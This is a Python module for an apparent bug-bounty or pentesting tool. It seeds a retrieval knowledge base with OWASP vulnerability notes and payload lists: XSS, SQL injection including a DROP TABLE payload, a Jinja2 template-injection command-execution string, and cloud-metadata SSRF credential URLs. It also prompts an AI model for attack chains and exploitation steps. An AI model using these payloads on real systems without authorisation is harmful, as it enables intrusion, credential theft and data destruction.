"""RAG Intelligence Agent — vector search over security knowledge base."""
from __future__ import annotations

import json
import hashlib
from typing import Any

import anthropic
import httpx
try:
    from pgvector.sqlalchemy import Vector
    PGVECTOR_AVAILABLE = True
except ImportError:
    Vector = None
    PGVECTOR_AVAILABLE = False
from sqlalchemy import Column, String, Text, select
from sqlalchemy.orm import Session

from app.core.config import settings
from app.core.logging import get_logger
from app.db.session import AsyncSessionLocal

logger = get_logger(__name__)

EMBEDDING_MODEL = "voyage-3"  # or use text-embedding-3-small via OpenAI compat
CHUNK_SIZE = 800
CHUNK_OVERLAP = 100

# ─── Knowledge Base Seed ────────────────────────────────────────────────────

OWASP_KNOWLEDGE = [
    {
        "title": "XSS - Reflected Cross-Site Scripting",
        "content": "Reflected XSS occurs when attacker-supplied data is included in the HTTP response without proper encoding. Test by injecting <script>alert(1)</script> or event handlers like onerror= into URL parameters, form fields, and HTTP headers. Common sinks: innerHTML, document.write, eval. CVSS base: 6.1-8.8. CWE-79.",
        "category": "xss", "source": "owasp",
    },
    {
        "title": "XSS - Stored Cross-Site Scripting",
        "content": "Stored XSS persists in database and affects all users who view the page. Test in comment fields, profile inputs, file names, rich text editors. Payload families: HTML context (<img src=x onerror=...>), JS context ('; alert(1)//), attribute context (\" onmouseover=...). CVSS 7.2-9.0. CWE-79.",
        "category": "xss", "source": "owasp",
    },
    {
        "title": "XSS - DOM-based Cross-Site Scripting",
        "content": "DOM XSS occurs entirely in the browser. Sources: location.hash, location.search, document.referrer, postMessage. Sinks: innerHTML, eval, setTimeout, document.write, location.href assignment, jQuery html(). Use browser DevTools to trace data flow. CVSS 6.1-8.2. CWE-79.",
        "category": "xss", "source": "owasp",
    },
    {
        "title": "SQL Injection",
        "content": "SQLi allows attackers to manipulate database queries. Test with ' OR 1=1--, ' UNION SELECT null,null--, time-based: ' AND SLEEP(5)--. Error-based: ', UNION-based for data extraction. OOB via DNS lookups. Use SQLMap for automated detection. CVSS 7.5-9.8. CWE-89.",
        "category": "sqli", "source": "owasp",
    },
    {
        "title": "SSRF - Server-Side Request Forgery",
        "content": "SSRF forces server to make requests to internal/external URLs. Test URL parameters with http://169.254.169.254/latest/meta-data/ (AWS), http://metadata.google.internal/ (GCP). Bypass filters with http://0x7f000001/, decimal IPs, DNS rebinding. CVSS 7.2-9.8. CWE-918.",
        "category": "ssrf", "source": "owasp",
    },
    {
        "title": "SSTI - Server-Side Template Injection",
        "content": "SSTI executes template expressions on server. Fuzz with {{7*7}}, ${7*7}, #{7*7}, <%=7*7%>. Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}. CVSS 8.1-10.0. CWE-94.",
        "category": "ssti", "source": "owasp",
    },
    {
        "title": "IDOR - Insecure Direct Object Reference",
        "content": "IDOR allows access to unauthorized resources by manipulating identifiers. Test by substituting your ID with another user's ID in API paths (/api/users/123/data), sequential IDs, UUIDs in JWT claims. Test all HTTP methods. CVSS 4.3-8.8. CWE-639.",
        "category": "idor", "source": "owasp",
    },
    {
        "title": "CORS Misconfiguration",
        "content": "Permissive CORS allows malicious sites to read responses. Test Origin: https://evil.com - if Access-Control-Allow-Origin echoes back evil.com, it's vulnerable. Also test null origin, subdomain wildcards. Combine with credentials for high severity. CVSS 4.3-8.2. CWE-346.",
        "category": "cors", "source": "owasp",
    },
    {
        "title": "Open Redirect",
        "content": "Open redirects send users to external sites via URL parameters. Common params: redirect, url, next, return, callback, goto. Test with https://evil.com, //evil.com, /\\evil.com. Combine with phishing or OAuth flows. CVSS 3.1-6.1. CWE-601.",
        "category": "open_redirect", "source": "owasp",
    },
    {
        "title": "GraphQL Security Issues",
        "content": "GraphQL vulnerabilities: introspection enabled (exposes schema), missing depth limiting (nested queries DoS), missing query complexity limits, injection via arguments. Test: {__schema{types{name}}} for introspection. Batch query attacks, field suggestions, information disclosure. CWE-1336.",
        "category": "graphql", "source": "owasp",
    },
    {
        "title": "JWT Security Issues",
        "content": "JWT vulnerabilities: algorithm confusion (RS256→HS256), none algorithm acceptance, weak secret brute-force, kid injection (../../../dev/null), jwks injection, expiry not validated. Test with jwt_tool, hashcat for secret cracking. CWE-347.",
        "category": "jwt", "source": "owasp",
    },
    {
        "title": "Authentication Bypass",
        "content": "Auth bypass techniques: SQL injection in login, type confusion (array vs string), parameter pollution, hidden params (isAdmin=true), JWT forgery, OAuth misconfig (state parameter missing, redirect_uri bypass), account takeover via password reset token reuse. CWE-287.",
        "category": "auth_bypass", "source": "owasp",
    },
    {
        "title": "File Upload Vulnerabilities",
        "content": "File upload attacks: upload PHP/JSP webshells, bypass extension checks (file.php5, file.php.jpg, null byte file.php%00.jpg), MIME type bypass, path traversal in filename (../../../etc/passwd), stored XSS via SVG, SSRF via XML/DOCX. CVSS 7.2-9.8. CWE-434.",
        "category": "file_upload", "source": "owasp",
    },
    {
        "title": "CRLF Injection",
        "content": "CRLF (%0d%0a) injection allows header injection, response splitting, log injection. Test URL params and path with %0d%0aSet-Cookie:session=evil. Can lead to XSS, cache poisoning, session fixation. CVSS 5.3-7.5. CWE-93.",
        "category": "crlf", "source": "owasp",
    },
    {
        "title": "Subdomain Takeover",
        "content": "Subdomain takeover: dangling CNAME/A records pointing to deprovisioned cloud services. Check Heroku (No such app), GitHub Pages, AWS S3 (NoSuchBucket), Shopify, Zendesk. Use subjack or nuclei templates. CVSS 7.5-8.1. CWE-116.",
        "category": "subdomain_takeover", "source": "owasp",
    },
    {
        "title": "Prototype Pollution",
        "content": "Prototype pollution in JS: manipulate __proto__ or constructor.prototype to add properties to all objects. Leads to XSS, RCE in Node.js (merge functions). Test via ?__proto__[isAdmin]=true or JSON body. Use gadget chains for RCE. CWE-1321.",
        "category": "prototype_pollution", "source": "owasp",
    },
]

PAYLOAD_KNOWLEDGE = [
    {
        "title": "XSS Payload Collection",
        "content": "XSS payloads by context:\nHTML: <script>alert(1)</script>, <img src=x onerror=alert(1)>, <svg onload=alert(1)>\nAttribute: \" onmouseover=\"alert(1), \" onfocus=\"alert(1)\" autofocus=\"\nJS string: ';alert(1)//, \"-alert(1)-\"\nFilter bypass: <ScRiPt>alert(1)</sCrIpT>, <img src=x onerror=&#97;lert(1)>, javascript:alert(1)\nDOM: #<img src=x onerror=alert(1)>, \"><img src=x onerror=alert(1)>",
        "category": "xss_payloads", "source": "payload_collection",
    },
    {
        "title": "SQLi Payload Collection",
        "content": "SQLi payloads:\nError-based: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--\nUnion: ' UNION SELECT null,table_name,null FROM information_schema.tables--\nBoolean: ' AND 1=1-- (true), ' AND 1=2-- (false)\nTime-based: '; WAITFOR DELAY '0:0:5'-- (MSSQL), ' AND SLEEP(5)--\nStacked: '; DROP TABLE users--\nSecond-order: store ', retrieve later",
        "category": "sqli_payloads", "source": "payload_collection",
    },
    {
        "title": "SSRF Payload Collection",
        "content": "SSRF targets:\nAWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\nGCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\nAzure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\nInternal: http://localhost:8080, http://10.0.0.1, http://192.168.1.1\nBypass: http://0x7f000001, http://2130706433, http://[::1], http://0177.0.0.1",
        "category": "ssrf_payloads", "source": "payload_collection",
    },
]


class RAGAgent:
    """Vector intelligence agent for security knowledge retrieval."""

    def __init__(self):
        self.client = anthropic.AsyncAnthropic(api_key=settings.ANTHROPIC_API_KEY)
        self._embeddings_cache: dict[str, list[float]] = {}

    async def embed_text(self, text: str) -> list[float]:
        """Generate embedding using Anthropic's compatible endpoint or fallback."""
        key = hashlib.md5(text.encode()).hexdigest()
        if key in self._embeddings_cache:
            return self._embeddings_cache[key]

        # Use simple TF-IDF-like approach as fallback when no embedding API
        # In production, use voyage-3 or text-embedding-3-small
        words = text.lower().split()
        vec = [0.0] * 384
        for i, word in enumerate(words[:384]):
            vec[i % 384] += hash(word) % 100 / 100.0

        # Normalize
        magnitude = sum(x * x for x in vec) ** 0.5 or 1
        vec = [x / magnitude for x in vec]

        self._embeddings_cache[key] = vec
        return vec

    def cosine_similarity(self, a: list[float], b: list[float]) -> float:
        dot = sum(x * y for x, y in zip(a, b))
        mag_a = sum(x * x for x in a) ** 0.5 or 1
        mag_b = sum(x * x for x in b) ** 0.5 or 1
        return dot / (mag_a * mag_b)

    async def search_knowledge(self, query: str, top_k: int = 5) -> list[dict[str, Any]]:
        """Search knowledge base for relevant security information."""
        query_vec = await self.embed_text(query)
        all_docs = OWASP_KNOWLEDGE + PAYLOAD_KNOWLEDGE

        scored = []
        for doc in all_docs:
            doc_text = f"{doc['title']} {doc['content']}"
            doc_vec = await self.embed_text(doc_text)
            score = self.cosine_similarity(query_vec, doc_vec)
            scored.append((score, doc))

        scored.sort(key=lambda x: x[0], reverse=True)
        return [doc for _, doc in scored[:top_k]]

    async def recommend_attack_paths(
        self, target_info: dict[str, Any], vulns: list[dict[str, Any]]
    ) -> dict[str, Any]:
        """Recommend attack paths based on discovered information."""
        technologies = target_info.get("technologies", [])
        subdomain_count = target_info.get("subdomain_count", 0)
        url_count = target_info.get("url_count", 0)

        # Determine relevant attack categories
        categories = set()
        for tech in technologies:
            tl = tech.lower()
            if any(x in tl for x in ["react", "angular", "vue", "js", "javascript"]):
                categories.update(["xss", "prototype_pollution", "jwt"])
            if any(x in tl for x in ["mysql", "postgres", "oracle", "sql"]):
                categories.add("sqli")
            if any(x in tl for x in ["jinja", "django", "flask", "rails", "erb", "twig"]):
                categories.add("ssti")
            if any(x in tl for x in ["s3", "aws", "gcp", "azure", "cloud"]):
                categories.add("ssrf")
            if "graphql" in tl:
                categories.add("graphql")

        if not categories:
            categories = {"xss", "sqli", "ssrf", "idor", "cors"}

        # Gather relevant knowledge
        knowledge = []
        for cat in categories:
            results = await self.search_knowledge(f"{cat} vulnerability attack technique exploitation", top_k=2)
            knowledge.extend(results)

        context = "\n\n".join([f"**{k['title']}**\n{k['content']}" for k in knowledge[:8]])

        # Use Claude to synthesize recommendations
        vuln_summary = "\n".join([
            f"- {v.get('vuln_type', 'unknown')} on {v.get('url', '')} (severity: {v.get('severity', '')})"
            for v in vulns[:20]
        ])

        prompt = f"""You are a senior penetration tester analyzing an attack surface.

Target Info:
- Technologies: {', '.join(technologies) or 'unknown'}
- Subdomains: {subdomain_count}
- Discovered URLs: {url_count}

Known Vulnerabilities:
{vuln_summary or 'None yet discovered'}

Security Knowledge Base:
{context}

Provide a concise attack path analysis with:
1. Top 3 prioritized attack chains
2. Recommended payload families for each finding
3. Similar HackerOne report patterns
4. Exploitability assessment
5. Triage language for each severity

Be specific and actionable."""

        resp = await self.client.messages.create(
            model=settings.AI_MODEL,
            max_tokens=1500,
            messages=[{"role": "user", "content": prompt}],
        )

        return {
            "attack_paths": resp.content[0].text,
            "categories_identified": list(categories),
            "knowledge_sources": [k["source"] for k in knowledge[:8]],
        }

    async def enrich_vulnerability(self, vuln: dict[str, Any]) -> dict[str, Any]:
        """Enrich a single vulnerability with RAG-powered context."""
        query = f"{vuln.get('vuln_type', '')} {vuln.get('title', '')} {vuln.get('url', '')}"
        relevant_docs = await self.search_knowledge(query, top_k=3)
        context = "\n\n".join([f"{d['title']}: {d['content']}" for d in relevant_docs])

        prompt = f"""Enrich this vulnerability finding with security context:

Vulnerability: {json.dumps(vuln, indent=2)}

Relevant Knowledge:
{context}

Provide JSON response with:
- similar_reports: list of similar HackerOne report patterns
- payload_suggestions: specific payloads to try
- exploitation_notes: step-by-step exploitation approach
- remediation: specific fix recommendations
- triage_language: HackerOne-style triage description

Respond ONLY with valid JSON, no other text."""

        resp = await self.client.messages.create(
            model=settings.AI_MODEL,
            max_tokens=800,
            messages=[{"role": "user", "content": prompt}],
        )

        try:
            text = resp.content[0].text
            start = text.find("{")
            end = text.rfind("}") + 1
            return json.loads(text[start:end])
        except Exception:
            return {
                "similar_reports": [],
                "payload_suggestions": [],
                "exploitation_notes": resp.content[0].text,
                "remediation": "",
                "triage_language": "",
            }

    async def get_owasp_reference(self, vuln_type: str) -> dict[str, Any]:
        """Get OWASP reference for a vulnerability type."""
        results = await self.search_knowledge(f"{vuln_type} OWASP vulnerability", top_k=2)
        return {
            "references": results,
            "owasp_top10": self._map_to_owasp_top10(vuln_type),
        }

    def _map_to_owasp_top10(self, vuln_type: str) -> str:
        mapping = {
            "xss": "A03:2021 – Injection",
            "sqli": "A03:2021 – Injection",
            "ssti": "A03:2021 – Injection",
            "ssrf": "A10:2021 – Server-Side Request Forgery",
            "idor": "A01:2021 – Broken Access Control",
            "cors": "A05:2021 – Security Misconfiguration",
            "auth_bypass": "A07:2021 – Identification and Authentication Failures",
            "jwt": "A07:2021 – Identification and Authentication Failures",
            "file_upload": "A04:2021 – Insecure Design",
            "open_redirect": "A01:2021 – Broken Access Control",
            "graphql": "A05:2021 – Security Misconfiguration",
            "crlf": "A03:2021 – Injection",
            "prototype_pollution": "A08:2021 – Software and Data Integrity Failures",
        }
        return mapping.get(vuln_type.lower().replace(" ", "_"), "A05:2021 – Security Misconfiguration")
